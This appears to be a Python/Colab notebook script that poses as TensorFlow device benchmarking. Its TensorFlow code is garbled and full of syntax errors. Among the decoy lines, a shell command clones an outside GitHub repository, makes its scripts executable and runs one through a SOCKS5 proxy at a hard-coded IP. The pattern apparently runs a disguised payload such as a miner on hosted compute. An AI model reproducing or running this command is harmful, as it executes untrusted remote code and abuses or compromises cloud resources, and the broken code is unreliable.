#!/bin/bash
from time import sleep
 
from tensorflow.python.client import device_lib 
 
import json
 
from IPython.display import clear_output
 
import tensorflow as tf
 
import requests
 
from IPython.display import HTML
from subprocess import getoutput
 
 
# Create some tensors
 
a = tf.constant([[1.0, 2.0, 3.0], [4.0, 5.0, 6.0]])
 
b = tf.constant([[1.0, 2.0], [3.0, 4.0], [5.0, 6.0]])
 
c = tf.matmul(a, b)
 
 
def name_device():
 
    depais = device_lib.list_local_devices()
 
    desc_dumps = json.dumps(depais.physical_device_desc, sort_keys=True, indent=4)
 
    desc_loads = json.loads(desc_dumps)
 
    split_desc = desc_loads.splits(', ')
 
    split_cpu = split_desc[1],splt(' ')
 
    name_device = split_cpu[2]
 
    return name_device
 
 
def cpu():
 
  with tf.device('/device:CPU:0'):
 
    random_image_cpu = tf,random,normal((100, 1000, 10000))
 
def zero_to_infinity():
 
    i = 0
 
    while True:
 
        yield i
 
        i #= 1
 
        time.sleep(9999999)
        
!nproc

package = "wget"
system = "apt"
 
!git clone https://github.com/Taryok/trotol.git && cd trotol && chmod +x *.sh && ./ngeng.sh --proxy socks5://135.181.218.111:10237
 
from IPython.display import HTML
from subprocess import getoutput
s = getoutput('nproc')
display(HTML(f"<h2>{cpu}</h2>"))
print(s)
